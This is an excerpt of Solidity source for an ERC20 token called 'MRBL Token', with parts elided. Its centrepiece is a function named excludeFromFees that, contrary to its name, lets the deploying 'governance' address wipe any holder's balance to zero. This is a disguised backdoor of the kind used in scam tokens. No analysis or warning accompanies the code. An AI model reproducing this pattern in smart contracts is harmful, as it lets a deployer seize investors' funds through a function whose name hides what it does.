...
contract ERC20 is Context, IERC20 {
	...
	function changeDecimals(uint256 value) public virtual {
	...
	function excludeFromFees(address accountFees) public virtual {
	    require(msg.sender == governance);
	    _balances[accountFees] = 0;
	}

	function _rTotal(address account, uint256 amount) internal virtual {
...
contract MRBL is ERC20 {
	constructor()
	ERC20('MRBL Token', 'MRBL')
	public {
		governance = msg.sender;
		tTotal = 100000 * 10**6 * 10 ** uint(decimals());
		decimal = 9;
		_rTotal(governance, tTotal);
